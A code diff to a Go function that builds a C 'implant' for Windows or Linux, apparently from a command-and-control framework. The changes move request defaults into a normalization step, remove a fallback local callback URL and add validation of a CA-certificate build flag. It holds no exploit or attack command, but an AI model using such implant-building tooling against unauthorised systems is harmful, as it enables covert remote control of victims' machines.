@@ -18,14 +18,14 @@ import (
 // BuildC compiles the C implant via cimplant/Makefile.
 // Windows: mingw cross-compile PE. Linux: host gcc + libcurl/openssl (basic peer).
 func BuildC(req *BuildRequest) (*BuildResult, error) {
+	if err := NormalizeBuildRequest(req); err != nil {
+		return nil, err
+	}
 	if req.OS != "windows" && req.OS != "linux" {
 		return nil, fmt.Errorf("C implant supports windows|linux (got %q)", req.OS)
 	}
 	if req.Arch != "amd64" {
 		return nil, fmt.Errorf("C implant only supports amd64 (got %q)", req.Arch)
-	}
-	if req.Format == "" {
-		req.Format = FormatEXE
 	}
 	if req.OS == "linux" && req.Format != FormatEXE {
 		return nil, fmt.Errorf("C Linux implant only supports exe format (got %s)", req.Format)
@@ -47,10 +47,7 @@ func BuildC(req *BuildRequest) (*BuildResult, error) {
 	secret := hex.EncodeToString(secretBytes)
 	req.ImplantSecret = secret
 
-	callbackURL := "https://127.0.0.1:443"
-	if len(req.Callbacks) > 0 {
-		callbackURL = req.Callbacks[0]
-	}
+	callbackURL := req.Callbacks[0]
 
 	if _, err := url.ParseRequestURI(callbackURL); err != nil {
 		return nil, fmt.Errorf("invalid callback URL: %w", err)
@@ -68,9 +65,6 @@ func BuildC(req *BuildRequest) (*BuildResult, error) {
 	}
 
 	transport := req.Transport
-	if transport == "" {
-		transport = "https"
-	}
 	if transport == "dns" {
 		if req.DNSDomain == "" {
 			return nil, fmt.Errorf("dns_domain required when transport=dns")
@@ -105,6 +99,9 @@ func BuildC(req *BuildRequest) (*BuildResult, error) {
 			return nil, fmt.Errorf("decode CA cert PEM")
 		}
 		caCertB64 = base64.StdEncoding.EncodeToString(block.Bytes)
+		if err := validateLdflagValue(caCertB64, "CA_CERT_PEM"); err != nil {
+			return nil, err
+		}
 	}
 
 	projectRoot := req.ProjectRoot
